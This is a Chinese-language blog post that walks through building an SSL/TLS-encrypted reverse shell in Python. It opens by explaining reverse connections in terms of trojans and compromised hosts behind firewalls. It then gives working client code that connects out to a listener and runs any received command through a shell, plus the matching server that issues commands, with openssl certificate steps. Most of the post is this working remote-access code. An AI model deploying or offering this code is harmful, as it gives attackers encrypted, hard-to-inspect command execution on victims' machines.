---
layout: post
title:  "Python实现基于SSL传输的反向shell"
date:   2018-12-15 20:15:33 +0700
categories: [安全编程]
---

## 0x00 前言

**什么是反弹shell，为什么会用到反弹shell？**

通常用于被控端因防火墙受限、权限不足、端口被占用等情形

假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？

1. 某客户机中了你的网马，但是它在局域网内，你直接连接不了。
2. 它的ip会动态改变，你不能持续控制。
3. 由于防火墙等限制，对方机器只能发送请求，不能接收请求。
4. 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。

那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。

最近在复习SSL协议的握手过程，想利用python实现反向shell的传输加密，并且使用wireshark抓包来验证这个过程。

## 0x01 生成证书

本人是使用`openssl` 生成服务端证书的，采取的是单向认证，客户端一般都是匿名。生成证书命令如下：

```
openssl genrsa -des3 -out server.key 2048
openssl rsa -in server.orig.key -out server.key
openssl req -new -key server.key -out server.csr
openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
```

## 0x02 SSL握手过程

![SSL Protocol]({{site.url}}/images/SSLProtocol.png)

## 0x03 客户端

`ssl` 模块能为底层socket连接添加SSL的支持。 `ssl.wrap_socket()` 函数接受一个已存在的socket作为参数并使用SSL层来包装它。

```python
def create_socket():
    try:
        global host
        global port
        global ssls
        host = '192.168.244.165'
        port = 8000
        s = socket.socket()
        ssls = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1) 
    except socket.error as msg:
        print('Socket create failed: ' + str(msg))
```

连接一个远程的socket连接

```python
def socket_connect():
    try:
        global host
        global port
        global s
        ssls.connect((host,port))
    except socket.error as msg:
        print("Socket connect failed" + str(msg))
```

然后接受服务端传输过来的命令，执行后返回给服务端

```python
def receive_command():
    global s
    while True:
        data = ssls.recv(1024)
        #change dir
        if data[:2].decode('utf-8') == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            #excute command
            cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes)
            ssls.send(str.encode(output_str))
    s.close()
```

## 0x04 服务端

创建一个socket，并且绑定服务端的证书，就是使用刚刚生成的证书

```python
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 8000
        s = socket.socket()
        s = ssl.wrap_socket(s, certfile='twoday.crt', keyfile='twoday.key', ssl_version=ssl.PROTOCOL_TLSv1)
    except s.error as msg:
        print('create socket failed: ' + str(msg))
```

socket进行绑定端口，并且开启监听模式，等待客户端来连接

```python
def socket_bind():
    try:
        global s
        global host
        global port
        print("Binding socket to port: " + str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print('connect socket failed: ' + str(msg) + '\n')
        #Rebind
        socket_bind() 
```

`send_command()` 函数将服务端想要执行的命令发送给客户端，并且将返回的结果进行显示

```python
def send_command(conn):
    while True:
        cmd = input('\n>>> ')
        if cmd == 'exit':
            conn.close()
            s.close()
            sys.exit()
        #if cmd has data
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_respone = str(conn.recv(1024))
            print(client_respone , end='')
```

`socket_accpet()`函数与客户端进行连接，并且调用`send_command()`函数进行交互。

```python
def socket_accpet():
    conn, address = s.accept()
    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
    send_command(conn)
    conn.close()
```

## 0x05 分析结果

运行`server.py`，并且在虚拟机Ubuntu下运行`client.py` ，可以看到客户端已经连接上了

![1544755521(1)]({{site.url}}/images/1544755521(1).jpg)

通过wireshark抓包，可以看到SSL的握手过程

![1544755421(1)]({{site.url}}/images/1544755421(1).jpg)

执行`ls`命令：

![1544755740(1)]({{site.url}}/images/1544755740(1).jpg)

可以看到命令已经执行成功。



完整代码：https://github.com/threeworld/reverse-shell

## 0x06 参考

* https://www.zhihu.com/question/24503813
* https://xz.aliyun.com/t/2549
* http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html